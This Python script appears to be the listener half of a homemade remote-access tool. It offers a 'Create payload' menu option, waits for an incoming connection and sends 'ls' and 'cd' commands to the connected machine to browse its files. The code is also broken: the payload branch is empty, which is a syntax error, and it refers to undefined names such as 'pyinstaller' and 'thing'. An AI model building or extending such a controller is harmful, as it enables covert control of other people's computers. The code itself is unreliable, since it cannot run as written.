#!/usr/bin/env python

import socket
import os
import pickle
import time
import pip

def install_and_import(package):
    import importlib
    try:
        importlib.import_module(package)
    except ImportError:
        import pip
        pip.main(['install', package])
    finally:
        globals()[package] = importlib.import_module(package)


install_and_import(pyinstaller)


print("What the fuck you want")
print("1. Listen")
print("2. Create payload")

q = input()
if q == "1":
    os.system("clear")
    print("ok what ip")
    TCP_IP = input()
    os.system("clear")
    print("ok thanks. what port")
    TCP_PORT = int(input())
elif q == "2":


TCP_IP = '127.0.0.1'
TCP_PORT = 5006
BUFFER_SIZE = 1024
MESSAGE = "Hello, World!"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((TCP_IP, TCP_PORT))
s.listen(1)
s, addr = s.accept()
print('Connection address:', addr)
while True:
    s.settimeout(60)
    thing2 = thing.split()
    if thing2[0]:
        if thing2[0] == "ls":
            s.send(" ".join(thing2).encode())
            dataraw = s.recv(BUFFER_SIZE).decode()
            data = dataraw.split()
            for x in data:
                print(x)
        elif thing2[0] == "cd":
            if thing2[1]:
                s.send(" ".join(thing2).encode())
                s.settimeout(10)
                try:
                    q = s.recv(BUFFER_SIZE).decode()
                    print(q)
                except:
                    print("timed out")
